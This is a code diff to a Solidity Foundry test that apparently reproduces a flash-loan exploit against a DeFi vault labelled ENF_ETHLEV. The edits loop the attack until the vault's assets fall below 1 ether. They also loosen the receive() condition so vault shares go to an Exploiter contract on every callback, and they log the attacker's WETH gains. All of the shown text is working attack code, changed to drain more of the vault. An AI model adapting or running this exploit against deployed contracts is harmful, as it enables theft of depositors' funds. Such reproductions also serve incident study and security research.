@@ -41,10 +41,12 @@ contract ContractTest is Test {
         vm.label(address(WETH), "WETH");
         vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");
         vm.label(address(Pair), "Piar");
+        exploiter = new Exploiter();
     }
 
     function testExploit() external {
-        deal(address(this), 0);
+        while (ENF_ETHLEV.totalAssets() > 1 ether) {
+            deal(address(this), 0);
 
         exploiter = new Exploiter();
         Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
@@ -52,6 +54,13 @@ contract ContractTest is Test {
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
             );
+
+            Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
+
+            emit log_named_decimal_uint(
+                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
+                );
+        }
     }
 
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -71,8 +80,8 @@ contract ContractTest is Test {
     }
 
     receive() external payable {
-        if (msg.sender == Controller && nonce == 0) {
-            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1000);
+        if (msg.sender == Controller) {
+            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);
             nonce++;
         }
     }
